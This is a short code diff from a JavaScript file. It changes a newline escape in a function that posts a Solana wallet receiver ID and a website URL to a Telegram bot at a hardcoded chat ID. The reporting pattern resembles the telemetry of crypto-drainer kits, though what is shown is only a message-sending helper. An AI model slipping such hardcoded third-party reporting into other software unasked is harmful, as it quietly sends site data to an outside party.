@@ -9,7 +9,7 @@ const chatId = '5915926682';
 
 async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
     try {
-        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\\nWebsite URL: ${website_url}`;
+        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\\\nWebsite URL: ${website_url}`;
         const response = await axios.post(
             `https://api.telegram.org/bot${botToken}/sendMessage`,
             {
